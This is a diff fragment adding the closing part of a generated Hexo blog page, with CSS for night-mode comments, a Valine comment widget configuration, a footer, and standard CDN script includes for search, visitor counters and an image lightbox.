+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
